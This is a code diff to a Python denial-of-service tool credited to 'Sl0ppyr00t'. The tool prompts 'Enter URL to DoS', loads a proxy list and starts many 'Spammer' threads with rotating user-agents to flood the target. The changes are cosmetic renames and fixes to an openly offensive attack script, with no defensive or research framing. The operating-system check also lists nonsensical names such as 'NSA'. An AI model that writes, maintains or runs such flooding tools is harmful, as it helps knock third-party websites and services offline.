@@ -8222,6 +8222,7 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"	        			
 			]
 			
+
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
@@ -8281,7 +8282,7 @@ def title():
 
 class MainLoop():
     def __init__(self):
-        if os.name in ("nt", "dos", "ce", "pe", "me", "slr", "0x", "Mac", "Unix", "Win", "NSA"):
+        if os.name in ("nt", "dos", "ce", "pe", "me", "slr", "0x", "Mac", "Unix", "Win", "NSA", "BeOS", "Amiga", "VMS"):
             title()
 
     def check_url(self, url):
@@ -8305,7 +8306,7 @@ class MainLoop():
             print(Fore.YELLOW + "     Team : Sl0ppyr00t    ")
             print(Fore.RED + "0000000000000000000000000000")
             print(Style.RESET_ALL)
-            url = input('> Enter Url to DoS: ')
+            url = input('> Enter URL to DoS: ')
             url = self.check_url(url)
             try:
                 req = urllib.request.Request(url, None, {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36'})
@@ -8316,9 +8317,9 @@ class MainLoop():
 
         while True:
             try:
-                l = input('> Enter the path to the proxy list: ')
-                with open(l, 'r') as in_file:
-                    lista = [i.strip() for i in in_file.readlines()]
+                proxy_file = input('> Enter the path to the proxy list: ')
+                with open(proxy_file, 'r') as in_file:
+                    proxy_list = [i.strip() for i in in_file.readlines()]
                 break
             except:
                 print('Error reading the proxy list file.')
@@ -8331,7 +8332,7 @@ class MainLoop():
                 print('Invalid input. Please enter a number.')
 
         for i in range(num_threads):
-            Spammer(url, i + 1, lista).start()
+            Spammer(url, i + 1, proxy_list).start()
 
 if __name__ == '__main__':
     N = 0
